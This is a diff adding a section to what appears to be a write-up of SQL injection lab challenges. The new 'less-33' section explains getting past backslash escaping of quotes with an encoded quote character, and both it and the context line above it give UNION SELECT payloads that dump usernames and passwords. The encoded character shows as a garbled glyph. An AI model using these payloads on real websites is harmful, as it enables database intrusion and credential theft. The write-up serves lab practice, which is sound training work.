@@ -292,4 +292,16 @@ payload``') union(select (1),group_concat(username),group_concat(password) from%
 
 ![image](https://user-images.githubusercontent.com/61080375/116713856-cf4c5c80-a9f2-11eb-8eb2-7023c2e51e5f.png)
 
+less-33
+========
+
+* In this challenge we can see that we cannot inject any ``'`` or ``\`` directly as the backend is adding ``\`` to escape our quotes 
+
+![image](https://user-images.githubusercontent.com/61080375/117163266-1e263780-ade1-11eb-8011-0c90a3fccfff.png)
+
+* Here we can use encoding to bypass the adding ``\``,the backend only checks for the ``'`` or ``\`` in plane text so we can use different encoding schema to bypass that cheks
+*  encode ``'`` in utf-16 ,etc. and add it insead of ``'``
+
+payload=``/?id=-1�' union select 1,group_concat(username),group_concat(password) from users --+``
+ ![image](https://user-images.githubusercontent.com/61080375/117163059-ec14d580-ade0-11eb-9472-7705513e85c1.png)
 
